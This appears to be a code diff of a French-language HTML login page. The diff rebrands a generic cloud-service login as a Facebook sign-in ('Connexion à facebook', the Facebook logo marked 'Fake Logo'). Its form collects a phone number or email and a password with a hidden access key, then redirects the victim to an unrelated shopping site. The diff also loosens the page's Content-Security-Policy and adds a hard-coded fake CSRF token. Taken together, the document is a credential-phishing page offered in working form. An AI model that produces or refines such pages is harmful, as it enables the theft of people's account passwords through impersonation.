@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta http-equiv="Content-Security-Policy" 
-      content="default-src 'self'; 
-               script-src 'self' 'unsafe-inline' 'nonce-random123';
-               style-src 'self' 'unsafe-inline'">
-    <title>Connexion à votre compte - Service Cloud</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <title>Connexion à facebook</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,8 +24,8 @@
             text-align: center;
         }
         .logo {
-            width: 100px;
-            margin-bottom: 20px;
+            width: 120px;
+            margin-bottom: 10px;
         }
         input {
             width: 100%;
@@ -60,13 +59,17 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Fake Logo">
         <h2>Connectez-vous</h2>
         <form method="POST" id="form">
-
+<form action="/submit" method="POST">
+  <!-- Token CSRF unique par session -->
+  <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6">
+  
     <input type="hidden" name="access_key" value="710c314c-d549-4cc0-a6d1-cd012f47158e">
 <input type="text" name="email" required placeholder="numéro de téléphone ou adresse mail">
     <input type="password" name="mp" required placeholder="Mot de passe">
     
-    <button type="submit">Submit Form</button>
+    <button type="submit">se connecter</button>
     <div id="result"></div>
+<input type="hidden" name="redirect" value="https://m.kikuu.com/search/result?kw=women%27s+shoes">
 </form>
 
 <script>
@@ -111,6 +114,10 @@ window.location.href = "https://m.kikuu.com/search/result?kw=women%27s+shoes";
         });
 });
 </script>
+            <div class="login-footer">
+<p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+<p><a href="#">Mot de passe oublié ?</a></p>
+</div>
     
 </body>
 </html>
